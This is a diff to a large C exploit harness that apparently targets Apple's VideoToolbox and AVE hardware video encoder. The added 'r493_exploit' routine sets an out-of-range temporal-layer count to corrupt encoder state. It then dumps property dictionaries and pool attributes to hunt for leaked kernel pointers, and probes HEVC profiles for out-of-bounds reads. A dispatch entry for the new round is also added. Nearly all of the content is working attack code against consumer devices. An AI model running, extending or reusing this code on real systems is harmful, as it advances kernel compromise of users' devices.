@@ -25294,6 +25294,300 @@ static void r492_exploit(void) {
     fflush(stdout);
 }
 
+/* ============================================================
+ * r493: VTCopySupportedPropertyDictionary + pool introspection
+ *
+ * Key insight: VT property queries go through mediaserverd/XPC
+ * to the kernel. If NTL corruption affects the property
+ * response data in the AVE object, the corrupted values come
+ * back through VTCopySupportedPropertyDictionary or other
+ * query APIs.
+ *
+ * Also: probe different encoder configurations (profiles,
+ * levels, formats) that might trigger the AVE OOB read CVEs.
+ * ============================================================ */
+
+static int r493_cbs = 0;
+static void r493_enc_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r493_cbs++;
+}
+
+static void r493_dump_dict(const char *prefix, CFDictionaryRef dict, int depth);
+
+static void r493_dump_value(const char *prefix, const char *key,
+                            CFTypeRef val, int depth) {
+    if (!val) return;
+    char indent[64] = {0};
+    for (int i = 0; i < depth * 2 && i < 60; i++) indent[i] = ' ';
+
+    CFTypeID tid = CFGetTypeID(val);
+    if (tid == CFNumberGetTypeID()) {
+        int64_t nv = 0;
+        CFNumberGetValue(val, kCFNumberSInt64Type, &nv);
+        rlog("%s%s%s = %lld\n", indent, prefix, key, (long long)nv);
+        /* Check for suspicious large values that could be kernel addresses */
+        if ((uint64_t)nv > 0xffff000000000000ULL) {
+            rlog("%s  *** SUSPICIOUS LARGE VALUE (possible kptr): 0x%llx ***\n",
+                 indent, (unsigned long long)nv);
+        }
+    } else if (tid == CFBooleanGetTypeID()) {
+        rlog("%s%s%s = %s\n", indent, prefix, key,
+             CFBooleanGetValue(val) ? "true" : "false");
+    } else if (tid == CFStringGetTypeID()) {
+        char buf[512];
+        CFStringGetCString(val, buf, 512, kCFStringEncodingUTF8);
+        rlog("%s%s%s = \"%s\"\n", indent, prefix, key, buf);
+    } else if (tid == CFDataGetTypeID()) {
+        CFIndex dlen = CFDataGetLength(val);
+        const UInt8 *d = CFDataGetBytePtr(val);
+        rlog("%s%s%s = data[%ld]:", indent, prefix, key, (long)dlen);
+        for (CFIndex j = 0; j < dlen && j < 32; j++) rlog(" %02x", d[j]);
+        if (dlen > 32) rlog(" ...");
+        rlog("\n");
+        for (CFIndex j = 0; j + 7 < dlen; j += 8) {
+            uint64_t v;
+            memcpy(&v, d + j, 8);
+            if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                rlog("%s  *** KPTR at off %ld: 0x%llx ***\n",
+                     indent, (long)j, (unsigned long long)v);
+            }
+        }
+    } else if (tid == CFDictionaryGetTypeID()) {
+        CFIndex cnt = CFDictionaryGetCount(val);
+        rlog("%s%s%s = dict[%ld]:\n", indent, prefix, key, (long)cnt);
+        if (depth < 3) r493_dump_dict("", val, depth + 1);
+    } else if (tid == CFArrayGetTypeID()) {
+        CFIndex cnt = CFArrayGetCount(val);
+        rlog("%s%s%s = array[%ld]\n", indent, prefix, key, (long)cnt);
+        for (CFIndex j = 0; j < cnt && j < 10; j++) {
+            char jk[32];
+            snprintf(jk, sizeof(jk), "[%ld]", (long)j);
+            r493_dump_value(prefix, jk, CFArrayGetValueAtIndex(val, j), depth + 1);
+        }
+    }
+}
+
+static void r493_dump_dict(const char *prefix, CFDictionaryRef dict, int depth) {
+    if (!dict) return;
+    CFIndex n = CFDictionaryGetCount(dict);
+    if (n <= 0 || n > 200) return;
+    const void **keys = malloc(sizeof(void*) * n);
+    const void **vals = malloc(sizeof(void*) * n);
+    CFDictionaryGetKeysAndValues(dict, keys, vals);
+    for (CFIndex i = 0; i < n && i < 50; i++) {
+        char kbuf[256] = {0};
+        if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+            CFStringGetCString(keys[i], kbuf, 256, kCFStringEncodingUTF8);
+        else
+            snprintf(kbuf, sizeof(kbuf), "key_%ld", (long)i);
+        r493_dump_value(prefix, kbuf, vals[i], depth);
+    }
+    free(keys);
+    free(vals);
+}
+
+static void r493_exploit(void) {
+    rlog("\n=== r493: VT property deep inspection ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Create HEVC encoder */
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+    int pf = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef enc = NULL;
+    VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128,
+        kCMVideoCodecType_HEVC, NULL, sa, NULL, r493_enc_cb, NULL, &enc);
+    CFRelease(sa);
+    if (!enc) { rlog("  Failed to create encoder\n"); goto r493_done; }
+
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+    /* Get supported property dictionary BEFORE corruption */
+    rlog("--- VTCopySupportedPropertyDictionary BEFORE ---\n");
+    {
+        CFDictionaryRef supported = NULL;
+        OSStatus st = VTSessionCopySupportedPropertyDictionary(enc, &supported);
+        rlog("  st=%d\n", (int)st);
+        if (st == noErr && supported) {
+            CFIndex cnt = CFDictionaryGetCount(supported);
+            rlog("  %ld supported properties\n", (long)cnt);
+            r493_dump_dict("  B:", supported, 0);
+            CFRelease(supported);
+        }
+    }
+
+    /* Prepare and do normal encode */
+    int ntl = 8;
+    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+    VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+    CFRelease(n);
+    VTCompressionSessionPrepareToEncodeFrames(enc);
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(enc);
+
+    {
+        CVPixelBufferRef pb = NULL;
+        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+        if (pb) {
+            CVPixelBufferLockBaseAddress(pb, 0);
+            memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                   CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+            VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(0, 30),
+                kCMTimeInvalid, NULL, NULL, NULL);
+            CVPixelBufferRelease(pb);
+        }
+        VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+    }
+
+    /* Corrupt with NTL=16462 */
+    rlog("\n--- Triggering NTL=16462 corruption ---\n");
+    ntl = 16462;
+    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+    VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+    CFRelease(n);
+    {
+        CVPixelBufferRef pb = NULL;
+        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+        if (pb) {
+            CVPixelBufferLockBaseAddress(pb, 0);
+            memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                   CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+            VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(1, 30),
+                kCMTimeInvalid, NULL, NULL, NULL);
+            CVPixelBufferRelease(pb);
+        }
+        VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+    }
+
+    /* Get supported property dictionary AFTER corruption */
+    rlog("\n--- VTCopySupportedPropertyDictionary AFTER ---\n");
+    {
+        CFDictionaryRef supported = NULL;
+        OSStatus st = VTSessionCopySupportedPropertyDictionary(enc, &supported);
+        rlog("  st=%d\n", (int)st);
+        if (st == noErr && supported) {
+            CFIndex cnt = CFDictionaryGetCount(supported);
+            rlog("  %ld supported properties (compare to BEFORE)\n", (long)cnt);
+            r493_dump_dict("  A:", supported, 0);
+            CFRelease(supported);
+        }
+    }
+
+    /* Try pixel buffer pool introspection after corruption */
+    rlog("\n--- Pixel buffer pool AFTER corruption ---\n");
+    {
+        CVPixelBufferPoolRef pool2 = VTCompressionSessionGetPixelBufferPool(enc);
+        rlog("  Pool before=%p after=%p\n", pool, pool2);
+
+        if (pool2) {
+            CFDictionaryRef pattrs = CVPixelBufferPoolGetPixelBufferAttributes(pool2);
+            if (pattrs) {
+                rlog("  Pool pixel buffer attributes:\n");
+                r493_dump_dict("  P:", pattrs, 0);
+            }
+            CFDictionaryRef ppool = CVPixelBufferPoolGetAttributes(pool2);
+            if (ppool) {
+                rlog("  Pool attributes:\n");
+                r493_dump_dict("  PP:", ppool, 0);
+            }
+        }
+    }
+
+    /* Try VTCompressionSessionGetTimeRangesForNextPass */
+    rlog("\n--- Multi-pass query after corruption ---\n");
+    {
+        CMTimeRange *ranges = NULL;
+        CMItemCount rangeCount = 0;
+        OSStatus mpst = VTCompressionSessionGetTimeRangesForNextPass(enc, &ranges, &rangeCount);
+        rlog("  Multi-pass: st=%d count=%ld\n", (int)mpst, (long)rangeCount);
+    }
+
+    VTCompressionSessionInvalidate(enc);
+    CFRelease(enc);
+
+    /* Part 2: Try HEVC with different profiles that might trigger
+     * different AVE internal paths / OOB reads */
+    rlog("\n--- Part 2: Profile-specific encoder probing ---\n");
+    {
+        CFStringRef profiles[] = {
+            CFSTR("HEVC_Main_AutoLevel"),
+            CFSTR("HEVC_Main10_AutoLevel"),
+            CFSTR("HEVC_Main42210_AutoLevel"),
+        };
+        int nprofiles = sizeof(profiles) / sizeof(profiles[0]);
+
+        for (int p = 0; p < nprofiles; p++) {
+            const char *pname = CFStringGetCStringPtr(profiles[p],
+                kCFStringEncodingUTF8);
+            rlog("  Profile: %s\n", pname ?: "?");
+
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, kVTCompressionPropertyKey_ProfileLevel, profiles[p]);
+
+            CFMutableDictionaryRef sa2 = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iop2 = CFDictionaryCreate(kCFAllocatorDefault,
+                NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(sa2, kCVPixelBufferIOSurfacePropertiesKey, iop2);
+            CFRelease(iop2);
+            int pf2 = kCVPixelFormatType_32BGRA;
+            CFNumberRef fn2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf2);
+            CFDictionarySetValue(sa2, kCVPixelBufferPixelFormatTypeKey, fn2);
+            CFRelease(fn2);
+
+            VTCompressionSessionRef enc2 = NULL;
+            OSStatus est = VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128,
+                kCMVideoCodecType_HEVC, es, sa2, NULL, r493_enc_cb, NULL, &enc2);
+            CFRelease(es);
+            CFRelease(sa2);
+            rlog("    create: st=%d\n", (int)est);
+
+            if (enc2) {
+                /* Query supported dict for this profile */
+                CFDictionaryRef sup = NULL;
+                VTSessionCopySupportedPropertyDictionary(enc2, &sup);
+                if (sup) {
+                    rlog("    %ld supported properties\n",
+                         (long)CFDictionaryGetCount(sup));
+                    CFRelease(sup);
+                }
+
+                /* Try NTL on this profile */
+                ntl = 16000;
+                n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                OSStatus ps = VTSessionSetProperty(enc2, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                rlog("    NTL=16000 set: st=%d\n", (int)ps);
+
+                VTCompressionSessionInvalidate(enc2);
+                CFRelease(enc2);
+            }
+        }
+    }
+
+r493_done:
+    rlog("\n=== r493 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -95371,6 +95665,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 497) {
+            rlog("*** rounds=497: VT property deep inspection + profile probing ***\n\n");
+            fflush(stdout);
+            r493_exploit();
+            goto done;
+        }
         if (rounds == 496) {
             rlog("*** rounds=496: AVE OOB read hunt + SurfHeist kptr ***\n\n");
             fflush(stdout);
@@ -98356,7 +98656,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
